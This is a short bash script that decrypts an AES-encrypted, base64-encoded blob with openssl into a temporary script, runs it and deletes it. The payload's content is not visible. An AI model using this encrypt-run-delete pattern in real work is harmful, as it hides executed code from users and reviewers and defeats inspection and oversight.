#!/bin/bash -e
cat <<EOF | openssl enc -aes256 -base64 -d > temp.sh
U2FsdGVkX1/mHYBZ/nupypnUUKZ3LOgdPsOl7jNISK5ViE/Zoq+sE4QseQzZPGrJ
taCCjQsiiHrnVskl4im/jyO0ornQUpDZF2Og0WgLUgJ5pG8iIJI4dtCLGOaU3B85
3YAjobrMquN4w+P2RB/K725HguIMAexjWXcLKWfqqyeaImXp8mXUoewJgjAX663k
ojtJcqcKFvLC7LdxxhNoLJNdrDhyznsat9dR4BaH1y99ey5GQ0rOl6NZq1owh6IV
ZNfj78TlNJgf/sWzVRrL2+IGfgWrCBGXbtXgss0ZAZcl/yE0ChnMWV+thbwHmjvY
aCM9uQXLayyu2MXEvgx8eA==
EOF
chmod +x temp.sh
./temp.sh
rm temp.sh
